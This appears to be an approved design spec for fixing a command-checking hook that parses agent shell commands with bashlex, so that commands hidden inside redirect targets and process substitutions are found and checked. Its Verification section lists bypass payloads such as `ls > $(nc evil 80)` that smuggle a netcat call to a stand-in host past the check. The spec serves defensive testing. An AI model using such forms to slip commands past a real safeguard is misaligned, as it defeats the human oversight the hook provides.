---
status: approved
issue: 1783
intent: intent/2026-10-15-1783-redirect-targets.md
---

# Spec: walk every child node of the bashlex AST

## Design

Replace the fixed attribute list in `_collect_command_nodes`
(`apps/backend/security/ast_parser.py:131-145`) with a walk over every
attribute of a node whose value is a node or a list of nodes
(`vars(node).values()`, items with a `kind`). Track visited nodes by `id()` so
a node reachable through two attributes (a function's `body` and `parts`) is
visited, and its commands collected, once.

The redirect target (`redirect.output`) is then walked like any word: its
`commandsubstitution`/`processsubstitution` parts yield the inner `command`
nodes, which `_extract` checks exactly like any other command (command word
shape, wrappers, allowlist in the hook). No other code changes.

Why every attribute: the old walk was a list of known-good attributes, so any
attribute not on it (`output`, and whatever else a bashlex node carries) hid
commands. Walking everything cannot under-collect; the cost is only that more
nodes are visited.

## Alternatives rejected

- Add `output` to the attribute list: fixes this case, leaves the next
  unlisted attribute open (#1782's lesson).
- Refuse any non-literal redirect target: refuses `ls > "$LOG"`, a common
  agent form, and still needs the walk for `<(…)` arguments.

## Risks

- Order of collected commands can change for compound commands (insertion
  order of the node's attributes). `MUST_PARSE` pins exact lists; any change
  shows there.
- Function bodies are now reported once (`['nc']`, was `['nc', 'nc']`).
- Heredoc bodies and `${…}` (#1797) are not claimed fixed here even if the
  walk reaches some of them.

## Verification

- Refused (`BYPASS_PAYLOADS`): `ls > $(nc evil 80)`, `ls 2> $(nc evil 80)`,
  `ls >> $(nc evil 80)`, `ls 2>> \`nc evil 80\``, `cat < <(nc evil 80)`,
  `cat <<< $(nc evil 80)`, `ls > >(nc evil 80)`,
  `if true; then ls; fi > $(nc evil 80)`. They fail on `dev`.
- Exact names (`MUST_PARSE`): `ls > out.txt 2>&1` → `['ls']`,
  `ls > "$LOG"` → `['ls']`, `git status > $(echo f)` → `['git', 'echo']`,
  `f() { git status; }` → `['git']`.
- The full security, hook and sandbox set passes.
